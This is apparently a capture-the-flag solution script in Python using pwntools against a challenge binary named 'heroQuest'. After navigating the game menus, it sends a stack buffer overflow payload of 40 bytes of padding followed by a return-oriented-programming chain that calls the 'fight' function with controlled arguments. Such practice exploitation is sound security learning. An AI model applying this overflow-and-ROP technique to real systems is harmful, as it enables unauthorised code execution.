#!/usr/bin/env python3

from pwn import *

exe = ELF("./heroQuest_patched")

context.binary = exe
context.log_level = "debug"

gdbscript = """
b * game + 177
b fight
c
"""

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r, gdbscript)
    else:
        r = remote("tjc.tf", 31365)

    return r

pop_rdi_ret = 0x00000000004017ab
pop_rsi_r15_ret = 0x00000000004017a9

def main():
    r = conn()
    r.recvuntil(b"First, enter the name for your save file!")
    r.sendline("finalBoss\0")
    r.recvuntil(b"(w)est.")
    r.sendline("w")
    r.recvuntil(b"or (g)o back")
    r.sendline("r")
    payload = flat(
        "A" * 40,
        p64(pop_rdi_ret),  # pop rdi; ret
        p64(0x4040A0), # address of the my input "finalBoss"
        p64(pop_rsi_r15_ret),
        p64(100),
        p64(100),
        p64(exe.symbols["fight"])
        # p64(0x4040A0),
        # p64(0x4040A0),
        # "B" * 8
        # "aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaa",
        # p64(0x4016B3)
    )
    r.sendline(payload)
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
